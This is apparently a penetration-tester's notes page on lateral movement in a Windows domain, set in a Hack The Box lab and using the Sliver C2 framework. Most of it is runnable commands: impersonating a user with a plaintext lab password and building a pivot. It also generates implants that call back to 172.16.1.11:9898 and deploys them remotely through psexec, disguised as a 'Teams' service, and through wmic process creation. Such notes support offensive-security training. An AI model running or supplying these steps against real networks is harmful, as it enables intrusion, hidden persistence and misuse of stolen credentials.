---
description: Using credentials of other users.
---

# Lateral Movement

First use make-token as part of imperonsation to create a new logon session. Utilities like impersonate and runas can be used to get an authenticated session.

| Logon Session                                                                                          | Authenticated Session                                                                         |
| ------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------- |
| Created with minimal proof (e.g., `make-token`) using user credentials.                                | Created via proper authentication (e.g., password, NTLM hash).                                |
| Represents an identity with potential access; no guaranteed authorization or full access to resources. | Represents a validated identity with full access to resources based on privileges.            |
| Often non-interactive, used for impersonation or privilege escalation.                                 | Often interactive, allowing full user actions or process execution with provided credentials. |
| Tools like `make-token` or low-level APIs can create logon sessions.                                   | Tools like `runas`, `PsExec`, or Kerberos TGT injection can provide authenticated sessions.   |

### <mark style="color:yellow;">Lateral Movement</mark>

Start by impersonating

```sh
# Make token
make-token -u svc_sql -d child.htb.local -p jkhnrjk123!

# Check access
ls //srv01.child.htb.local/c$
```

Setup a pivot

```sh
pivots tcp --bind 172.16.1.11
```

Create an implant

```sh
generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivo
```

Upload the binary

```sh
psexec --custom-exe /home/htb-ac590/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local
```

### <mark style="color:yellow;">Using WMIC</mark>

Windows Management Instrumentation (WMI) is a Windows administration tool that offers a environment for accessing and managing system components both locally and remotely. It allows system administrators to use VBScript or PowerShell scripts to efficiently manage Windows machines.

WMI serves as a built-in method for lateral movement and remote code execution, and it requires local administrator privileges.

```sh
# Generate an implant
sliver (http-beacon) > generate -i 172.16.1.11:9898 --skip-symbols -N wmicpivot

# Create a logon session
make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
```

Then execute

```sh
execute -o wmic /node:172.16.1.13 /user:svc_sql /password:jkhnrjk123! process call create "C:\\windows\\tasks\\wmicpivot.exe"
```

We will get a connection back because of the pivot.
